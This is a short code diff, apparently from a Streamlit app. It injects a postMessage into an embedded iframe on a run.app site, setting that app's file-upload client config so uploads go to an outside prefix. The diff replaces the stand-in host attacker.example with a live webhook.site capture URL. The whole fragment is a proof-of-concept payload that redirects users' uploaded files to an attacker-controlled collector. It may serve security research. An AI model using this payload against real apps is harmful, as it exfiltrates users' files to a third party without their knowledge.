@@ -10,7 +10,7 @@ components.html(f"""
      iframe.contentWindow.postMessage({{
        stCommVersion: 1,
        type: "SET_FILE_UPLOAD_CLIENT_CONFIG",
-       prefix: "https://attacker.example",
+       prefix: "https://webhook.site/204c903f-0e81-48bf-87b6-52bf71edd97f",
        headers: {{"X-Debug": "demo"}}
      }}, "https://activate-fwwrn5gbiq-ey.a.run.app");
    }});
